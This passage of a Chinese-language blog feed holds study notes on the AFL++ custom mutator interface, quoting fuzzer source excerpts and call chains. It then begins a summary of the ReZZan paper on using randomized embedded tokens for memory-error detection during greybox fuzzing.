class="hljs-title function_">post_trim</span>(<span class="hljs-params">success</span>):<br>    <span class="hljs-keyword">return</span> next_index<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">havoc_mutation</span>(<span class="hljs-params">buf, max_size</span>):<br>    <span class="hljs-keyword">return</span> mutated_out<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">havoc_mutation_probability</span>():<br>    <span class="hljs-keyword">return</span> probability <span class="hljs-comment"># int in [0, 100]</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">queue_get</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuzz_send</span>(<span class="hljs-params">buf</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">queue_new_entry</span>(<span class="hljs-params">filename_new_queue, filename_orig_queue</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">introspection</span>():<br>    <span class="hljs-keyword">return</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">deinit</span>():  <span class="hljs-comment"># optional for Python</span><br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></tbody></table></figure><h3 id="细节（C-x2F-C-）"><a href="#细节（C-x2F-C-）" class="headerlink" title="细节（C/C++）"></a>细节（C/C++）</h3><p><strong>变异部分</strong>：</p><ul><li><code>afl_custom_queue_get</code>：用于种子调度，决定该种子是否被模糊测试；</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 393 in afl-fuzz-one.c</span><br><span class="hljs-keyword">if</span> (unlikely(afl-&gt;custom_mutators_count)) {<br><br>    <span class="hljs-comment">/* The custom mutator will decide to skip this test case or not. */</span><br><br>    LIST_FOREACH(&amp;afl-&gt;custom_mutator_list, <span class="hljs-keyword">struct</span> custom_mutator, {<br><br>      <span class="hljs-keyword">if</span> (el-&gt;afl_custom_queue_get &amp;&amp;<br>          !el-&gt;afl_custom_queue_get(el-&gt;data, afl-&gt;queue_cur-&gt;fname)) {<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>      }<br><br>    });<br><br>  }<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_fuzz_count</code>：fuzz次数，相当于stage_max；</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 1883 in afl-fuzz-one.c</span><br>      <span class="hljs-keyword">if</span> (el-&gt;afl_custom_fuzz_count) {<br><br>        afl-&gt;stage_max = el-&gt;afl_custom_fuzz_count(el-&gt;data, out_buf, len);<br><br>      } <span class="hljs-keyword">else</span> {<br><br>        afl-&gt;stage_max = saved_max;<br><br>      }<br>  ...<br><span class="hljs-comment">// Line 1905 in afl-fuzz-one.c</span><br>      <span class="hljs-keyword">if</span> (!el-&gt;afl_custom_fuzz_count) {<br><br>              <span class="hljs-comment">/* If we're finding new stuff, let's run for a bit longer, limits</span><br><span class="hljs-comment">                permitting. */</span><br><br>              <span class="hljs-keyword">if</span> (afl-&gt;queued_items != havoc_queued) {<br><br>                <span class="hljs-keyword">if</span> (perf_score &lt;= afl-&gt;havoc_max_mult * <span class="hljs-number">100</span>) {<br><br>                  afl-&gt;stage_max *= <span class="hljs-number">2</span>;<br>                  perf_score *= <span class="hljs-number">2</span>;<br><br>                }<br><br>                havoc_queued = afl-&gt;queued_items;<br><br>              }<br><br>            }<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_fuzz</code>：执行特定的变异操作；</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 1932 in afl-fuzz-one.c</span><br>          <span class="hljs-type">size_t</span> mutated_size =<br>              el-&gt;afl_custom_fuzz(el-&gt;data, out_buf, len, &amp;mutated_buf, new_buf, target_len, max_seed_size);<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_havoc_mutation_probability</code>：表示<code>afl_custom_havoc_mutation</code>被调用的概率</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 2041 in afl-fuzz-one.c</span><br><span class="hljs-keyword">if</span> (el-&gt;stacked_custom &amp;&amp; el-&gt;afl_custom_havoc_mutation_probability) {<br><br>        el-&gt;stacked_custom_prob =<br>            el-&gt;afl_custom_havoc_mutation_probability(el-&gt;data);<br>        <span class="hljs-keyword">if</span> (el-&gt;stacked_custom_prob &gt; <span class="hljs-number">100</span>) {<br><br>          FATAL(<br>              <span class="hljs-string">"The probability returned by "</span><br>              <span class="hljs-string">"afl_custom_havoc_mutation_propability "</span><br>              <span class="hljs-string">"has to be in the range 0-100."</span>);<br><br>        }<br><br>      }<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_havoc_mutation</code>：自定义<code>havoc</code>变异操作；</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 2106 in afl-fuzz-one.c</span><br>    <span class="hljs-keyword">if</span> (afl-&gt;custom_mutators_count) {<br><br>        LIST_FOREACH(&amp;afl-&gt;custom_mutator_list, <span class="hljs-keyword">struct</span> custom_mutator, {<br><br>          <span class="hljs-keyword">if</span> (el-&gt;stacked_custom &amp;&amp;<br>              rand_below(afl, <span class="hljs-number">100</span>) &lt; el-&gt;stacked_custom_prob) {<br><br>            u8    *custom_havoc_buf = <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-type">size_t</span> new_len = el-&gt;afl_custom_havoc_mutation(<br>                el-&gt;data, out_buf, temp_len, &amp;custom_havoc_buf, MAX_FILE);<br>            <span class="hljs-keyword">if</span> (unlikely(!custom_havoc_buf)) {<br><br>              FATAL(<span class="hljs-string">"Error in custom_havoc (return %zu)"</span>, new_len);<br><br>            }<br><br>            <span class="hljs-keyword">if</span> (likely(new_len &gt; <span class="hljs-number">0</span> &amp;&amp; custom_havoc_buf)) {<br><br>              temp_len = new_len;<br>              <span class="hljs-keyword">if</span> (out_buf != custom_havoc_buf) {<br><br>                out_buf = afl_realloc(AFL_BUF_PARAM(out), temp_len);<br>                <span class="hljs-keyword">if</span> (unlikely(!afl-&gt;out_buf)) { PFATAL(<span class="hljs-string">"alloc"</span>); }<br>                <span class="hljs-built_in">memcpy</span>(out_buf, custom_havoc_buf, temp_len);<br><br>              }<br><br>            }<br><br>          }<br><br>        });<br><br>      }<br></code></pre></td></tr></tbody></table></figure><hr><p><strong>初始化/清理部分</strong>：</p><ul><li><code>afl_custom_init</code>：进行一些初始化操作maybe? 初始化一些data数据？<code>mutator-&gt;data</code>为void类型数据，可以存放一些自定义的东西？</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 1838 in afl-fuzz.c</span><br>  setup_custom_mutators(afl);<br><span class="hljs-comment">// -------------------------------------</span><br><span class="hljs-comment">// Line 335 in afl-fuzz-mutators.c </span><br>  <span class="hljs-comment">/* Initialize the custom mutator */</span><br>  <span class="hljs-keyword">if</span> (mutator-&gt;afl_custom_init) {<br><br>    mutator-&gt;data = mutator-&gt;afl_custom_init(afl, rand_below(afl, <span class="hljs-number">0xFFFFFFFF</span>));<br><br>  }<br></code></pre></td></tr></tbody></table></figure><p>调用链：afl-fuzz.c main ==&gt; setup_custom_mutators ==&gt; load_custom_mutator ==&gt; afl_custom_init</p><ul><li><code>afl_custom_deinit</code>：进行mutator的一些清理程序</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 2648 in afl-fuzz.c </span><br>  destroy_custom_mutators(afl);<br></code></pre></td></tr></tbody></table></figure><p>调用链： afl-fuzz.c main ==&gt; destroy_custom_mutators ==&gt; afl_custom_deinit</p><hr><p><strong>Trim相关：</strong></p><p><span class="github-emoji"><span>🍖</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f356.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 封装在<code>trim_case_custom</code>函数中（Line 350 in afl-fuzz-mutators.c中）</p><p>完整调用链：afl-fuzz-run.c (trim_case: 811) ==&gt; trim_case_custom ==&gt; xxx</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 823 in afl-fuzz-run.c</span><br>  <span class="hljs-keyword">if</span> (el-&gt;afl_custom_trim) {<br><br>        trimmed_case = trim_case_custom(afl, q, in_buf, el);<br>        custom_trimmed = <span class="hljs-literal">true</span>;<br><br>      }<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_init_trim</code>：初始化操作？可以定义trimming步长 ==&gt; stage_max？返回trim次数？</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 365 in afl-fuzz-mutators.c (trim_case_custom())</span><br> afl-&gt;stage_cur = <span class="hljs-number">0</span>;<br> s32 retval = mutator-&gt;afl_custom_init_trim(mutator-&gt;data, in_buf, q-&gt;len);<br> <span class="hljs-keyword">if</span> (unlikely(retval) &lt; <span class="hljs-number">0</span>) {<br><br>   FATAL(<span class="hljs-string">"custom_init_trim error ret: %d"</span>, retval);<br><br> } <span class="hljs-keyword">else</span> {<br><br>   afl-&gt;stage_max = retval;  <span class="hljs-comment">// &lt;============ trimming step!</span><br><br> }<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_trim</code>：执行自定义的精简操作？</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 384 in afl-fuzz-mutators.c (trim_case_custom())</span><br><span class="hljs-keyword">while</span> (afl-&gt;stage_cur &lt; afl-&gt;stage_max) {<br><br>    u8 *retbuf = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">sprintf</span>(afl-&gt;stage_name_buf, <span class="hljs-string">"ptrim %s"</span>,<br>            u_stringify_int(val_buf, trim_exec));<br><br>    u64 cksum;<br><br>    <span class="hljs-type">size_t</span> retlen = mutator-&gt;afl_custom_trim(mutator-&gt;data, &amp;retbuf);<br>    ...<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_post_trim</code>：修剪后处理操作？判断修剪是否成功？并更改一些参数值？</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 476 in afl-fuzz-mutators.c (trim_case_custom())</span><br>afl-&gt;stage_cur = mutator-&gt;afl_custom_post_trim(mutator-&gt;data, <span class="hljs-number">1</span>);<br>  ...<br><span class="hljs-comment">// Line 488 in afl-fuzz-mutators.c (trim_case_custom())</span><br>s32 retval2 = mutator-&gt;afl_custom_post_trim(mutator-&gt;data, <span class="hljs-number">0</span>);<br></code></pre></td></tr></tbody></table></figure><hr><p><strong>其他：</strong></p><ul><li><code>afl_custom_post_process</code>：post-processing函数，在AFL将测试用例写到磁盘之前调用（write_to_testcase?），以便执行被测目标</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 67 in afl-fuzz-run.c</span><br>u32 __attribute__((hot))<br>write_to_testcase(<span class="hljs-type">afl_state_t</span> *afl, <span class="hljs-type">void</span> **mem, u32 len, u32 fix) {<br>...<br>    <span class="hljs-comment">// Line 87 in afl-fuzz-run.c</span><br>    <span class="hljs-keyword">if</span> (el-&gt;afl_custom_post_process) {<br><br>        new_size =<br>            el-&gt;afl_custom_post_process(el-&gt;data, new_mem, new_size, &amp;new_buf);<br><br>        <span class="hljs-keyword">if</span> (unlikely(!new_buf || new_size &lt;= <span class="hljs-number">0</span>)) {<br><br>          new_size = <span class="hljs-number">0</span>;<br>          new_buf = new_mem;<br>          <span class="hljs-comment">// FATAL("Custom_post_process failed (ret: %lu)", (long</span><br>          <span class="hljs-comment">// unsigned)new_size);</span><br><br>        } <span class="hljs-keyword">else</span> {...}<br>...<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li><p><code>afl_custom_queue_new_entry</code>：允许额外的分析（例如，调用一个不同的工具，做一个不同的覆盖率，并将其保存在自定义变异器中）</p><p>调用链：afl-fuzz-init.c (pivot_inputs()) ==&gt; run_afl_custom_queue_new_entry() ==&gt; afl_custom_queue_new_entry()</p></li><li><p><code>afl_custom_describe</code>：给保存的文件名添加额外的描述</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 340 in afl-fuzz-bitmap.c(describe_op())</span><br>      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *custom_description = afl-&gt;current_custom_fuzz-&gt;afl_custom_describe(afl-&gt;current_custom_fuzz-&gt;data, size_left);<br>      <span class="hljs-keyword">if</span> (!custom_description || !custom_description[<span class="hljs-number">0</span>]) {<br><br>        DEBUGF(<span class="hljs-string">"Error getting a description from afl_custom_describe"</span>);<br>        <span class="hljs-comment">/* Take the stage name as description fallback */</span><br>        <span class="hljs-built_in">sprintf</span>(ret + len_current, <span class="hljs-string">"op:%s"</span>, afl-&gt;stage_short);<br><br>      } <span class="hljs-keyword">else</span> {<br><br>        <span class="hljs-comment">/* We got a proper custom description, use it */</span><br>        <span class="hljs-built_in">strncat</span>(ret + len_current, custom_description, size_left);  <span class="hljs-comment">// &lt;==== add describe here!</span><br><br>      }<br></code></pre></td></tr></tbody></table></figure><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><ol><li><p>AFL++ custom mutators本质上不是一个插件，而是在AFL++模糊测试阶段设置了若干函数端点，并以C/C++接口或者Python接口的方式暴露给用户，并提供给用户使用，旨在<strong>提高模糊器的功能性</strong></p></li><li><p>多参数项目对<code>fuzz_one()</code>进行了大改，主要包括两个部分：第一个部分从json文件中读入参数规范，第二个部分是根据参数类型选择特定的变异操作，AFL++ custom mutators虽然提供了变异方法，但该方法是在确定性变异后、havoc变异之前执行的，此外还可以在havoc阶段添加havoc_mutator，但：</p><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 多参数项目拆解了确定性变异和havoc，根据参数的类型来pick适当的变异操作，因此将多参数变异添加到custom mutators里不会有啥效果；</p><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> AFL++ custom mutators的流程是：在进行确定性变异之后，如果定义了custom_mutator，那么就执行custom_mutator定义的变异，否则跳转到进行havoc变异，其本质还是原生AFL++对于单个输入的顺序变异方式，并没有体现多参数的性质。因此如果要实现多参数，还是需要对引擎进行修改；</p><p><span class="github-emoji"><span>3⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 解析参数规范的部分貌似无法添加到合适的接口上；</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>模糊测试</tag>
      
      <tag>AFL++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReZZan:Efficient Greybox Fuzzing to Detect Memory Errors</title>
    <link href="/2023/01/10/ReZZan/"/>
    <url>/2023/01/10/ReZZan/</url>
    
    <content type="html"><![CDATA[<h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1. 引言"></a>1. 引言</h2><ul><li><p>内存错误是安全漏洞的常见来源</p><ul><li>赋予攻击者更改内存内容的能力，可能会构成信息泄露和控制流劫持</li></ul></li><li><p>内存错误的静默性：</p><ul><li>内存错误不一定会导致程序立即崩溃</li><li>进行插桩监控内存情况：Sanitizer（e.g. AddressSanitizer）</li></ul></li><li><p>fork模式的模糊测试 + 内容错误sanitizers = 显著的性能开销</p><ul><li>AFL+AddressSanitizer：吞吐量降低了约58%</li><li>性能下降的原因：<strong>sanitizer的实现与模糊测试过程之间的不利交互</strong><ul><li>传统sanitizer使用<strong>disjoint metadata</strong>来跟踪内存状态</li><li>维护disjoint metadata会引入额外的开销</li></ul></li></ul></li><li><p>基于LBC和REST等工具首创的随机化嵌入式令牌（RET）的思想来对内存sanitizer进行设计</p></li><li><p>ReZZan = REt + fuZZing + sANitizer</p><ul><li>在fork模式的模糊测试下速度明显更快</li><li>1.27 × 原生AFL的运行（AddressSanitizer 2.36 x ）</li><li>额外提供一种简化配置，无需精确的边界检查，开销为1.14 x</li></ul></li></ul><h3 id="1-1-贡献"><a href="#1-1-贡献" class="headerlink" title="1.1 贡献"></a>1.1 贡献</h3><ul><li><p>提出了一种基于随机嵌入令牌（RET）概念的内存错误sanitizer的设计</p></li><li><p>调整设计，无需使用disjoint metadata；此外介绍了在基于RET的设计下用于字节精确内存错误检测的精细边界检查的概念</p></li><li><p>以ReZZan工具的形式实现了该设计，并将ReZZan与流行的灰盒模糊器集成在一起</p></li><li><p>对ASAN和FuZZan进行比较，显示该方法的优越性</p></li><li><p>项目<strong>开源</strong>：<a href="https://github.com/bajinsheng/ReZZan">https://github.com/bajinsheng/ReZZan</a></p></li></ul><h2 id="2-背景"><a href="#2-背景" class="headerlink" title="2. 背景"></a>2. 背景</h2><p><strong>模糊测试：</strong></p><ul><li>fork server：</li></ul><p><img src="/2023/01/10/ReZZan/1.png"></p><hr><p><strong>内存错误Sanitizers：</strong></p><p><img src="/2023/01/10/ReZZan/2.png"></p><ul><li><p>专用Sanitizer和通用Sanitizer</p><p>专用Sanitizer：</p><ul><li>Stack金丝雀专门用于堆栈缓冲区溢出</li><li>LowFat和轻量级边界检查（LBC）专门用于溢出/下溢</li><li>FreeSentry专门用于UAF</li></ul><p>通用Sanitizer：</p><ul><li>AddressSanitizer：字节级精度检测所有类型的内存错误</li></ul></li><li><p>内存错误检测可能是部分检测或不精确检测：</p><ul><li>GWP-ASAN仅对随机选择的堆对象应用保护</li><li>LowFat/REST允许小的溢出（不与其他对象相交，即不影响其他对象变量值）</li></ul></li><li><p>AddressSanitizer：</p><ul><li><p>实施一种<strong>内存投毒</strong>（<em>memory poisoning</em>）的方法，其基本思想是：当使用一个内存错误能够访问该内存时，该内存则别标记为“中毒”，包括：</p><ul><li>对每个有效分配对象之间插入的小的<strong>REDZONE</strong>区域进行标记，该区域用于检测对象边界溢出/下溢错误</li><li>对<code>free()</code>的内存进行标记来检测UAF错误</li></ul></li><li><p>使用运行时支持库来<span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 在已分配对象之间插入redzone并对其标记；<span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 对<code>free()</code>的内存进行标记</p></li><li><p>对所有内存访问操作进行插桩，以检测内存是否中毒：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( poisoned ( p )) <span class="hljs-comment">// Instrumentation</span><br>error ();<br>* p = v ; <span class="hljs-comment">/* or */</span> v = * p ; <span class="hljs-comment">// Access </span><br></code></pre></td></tr></tbody></table></figure></li></ul></li><li><p><strong>AddressSanitizer的内存投毒</strong>：</p><ul><li><p>将程序的虚拟地址空间分为两个部分来实现内存投毒：应用程序内存(application memory) 和 影子内存(shadow memory)</p></li><li><p>影子内存用以跟踪应用程序内存中每个字节的中毒情况。因此，应用程序内存每8个字节都将映射到相应的影子字节，i.e. $addr_{shadow}=offset_{shadow}+(addr/8)$，这里的影子内存其实就是<strong>disjoint metadata</strong>的一种表现</p></li><li><p><strong>disjoint metadata</strong>（i.e. 一种额外的metadata）：<span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 由Sanitizer维护；<span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 与应用程序内存/数据分离</p><ul><li>会带来额外的内存开销</li><li>影响了内存位置（i.e. 应用程序和影子内存是分离的）</li></ul></li></ul></li><li><p>内存投毒的替代实现——<strong>RET（随机化嵌入令牌）</strong>：</p><ul><li><p>poisoned内存由一个特殊的<strong>令牌</strong>表示，该令牌初始化为某个预定的随机数值，如果内存直接存储该随机值，则认为内存“中毒”了</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">poisoned(p)=(*(p-p%<span class="hljs-keyword">sizeof</span>(Token))==NONCE)<br></code></pre></td></tr></tbody></table></figure></li><li><p>如果NONCE值与程序正常执行期间创建的合法值冲突，则可能会发生错误的检测</p></li><li><p><strong>REST</strong>使用一个非常大的令牌大小（整个512位缓存线）和一个强大的伪随机源</p><ul><li><p>大型（多字节）令牌会导致内存错误检测粒度降低（粗粒度）</p></li><li><p>e.g. 给定REST 512位（64字节）令牌，对malloc(27)的调用将：</p><p>(1) 将分配大小增加 64 - 27 = 37 字节</p><p>(2) 分配已对齐了一个64字节的对象</p><p>(3) 在64..127字节处存储一个token值来实现redzone</p><p>i.e. 27..63字节的溢出都不会访问令牌，即不会判断为内存错误，因此<strong>REST不是字节精确的</strong></p></li></ul></li><li><p>RET思想最早被<strong>LBC</strong>所使用，不像REST，LBC使用单字节（8位）令牌大小，允许进行字节精确的内存错误检测，但这也意味着碰撞不可避免；为了避免碰撞，LBC实现了一种混合方法，该方法保留了<strong>disjoint metadata</strong>，以区分冲突和合法的内存错误</p></li></ul></li></ul><hr><p><strong>问题描述：</strong></p><ul><li><p>现象：模糊测试和Sanitizer应该协同工作，但在实践中，模糊测试和Sanitizer的组合性能较差</p></li><li><p>根本原因：fork()系统调用的写时复制（<em>copy-on-write</em> COW）语义与Sanitizer对于任何<strong>disjoint metadata</strong>的初始化/使用之间的交互</p><ul><li>子进程因发生页面错误而拷贝页</li><li>fuzzing + sanitizer会导致页面错误的激增：一个用于已分配的对象，另一个用于<strong>disjoint metadata</strong></li></ul></li><li><p>AddressSanitizer还引入了与fork()相关的其他开销，e.g.复制内核数据结构（包括虚拟内存VMA、页表和相关拆卸开销）</p></li></ul><hr><p><strong>解决办法</strong>：</p><ul><li>一个想法是选择一个具有低内存开销和高局部性的内存错误Sanitizer</li><li>另一个想法是优化<strong>disjoint metadata</strong>的表示</li></ul><h3 id="2-1-我们的设计"><a href="#2-1-我们的设计" class="headerlink" title="2.1 我们的设计"></a>2.1 我们的设计</h3><ul><li><p>提出一种基于随机化嵌入令牌（RET）的变体，该变体不使用影子内存或其他disjoint metadata表示</p></li><li><p>关键思想是通过使用内存本身跟踪中毒状态</p><ul><li>避免任何的其他页错误（由disjoint metadata的初始化或访问导致的）</li><li>插桩检查和相应的内存操作不会带来额外的页错误</li></ul></li><li><p>设计的主要元素总结如下：</p><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>令牌大小</strong></p><ul><li>某些现有的工具基于RET设计，如RESR（令牌大小512位）和LBC（令牌大小8位）</li><li>见解：对于模糊测试应用，可以容忍一些小级别的错误检测<ul><li>medium 令牌大小：64位</li><li>使用不同的随机化NONCE值重新执行测试用例可以在一定程序上减轻错误检测的开销</li></ul></li></ul><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>内存错误检测粒度</strong></p><ul><li>在基本的RET设计下，tokens需要存储在token大小对齐的边界上，也就是说64位tokens需要进行8字节对齐</li><li>对RET进行改进：对象边界信息直接<strong>编码</strong>到令牌表示本身中</li></ul><p><span class="github-emoji"><span>3⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>硬件</strong></p><ul><li>REST：无标准硬件扩展；LBC：32位x86系统</li><li>本文提出的基于RET的设计：针对标准硬件（x86_64）和标准模糊器设计</li></ul></li></ul><h2 id="3-基本内存错误检测"><a href="#3-基本内存错误检测" class="headerlink" title="3. 基本内存错误检测"></a>3. 基本内存错误检测</h2><ul><li>使用以下结构类型来定义RET：</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Token</span> {</span> <span class="hljs-type">uint64_t</span> random; };<br></code></pre></td></tr></tbody></table></figure><hr><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" 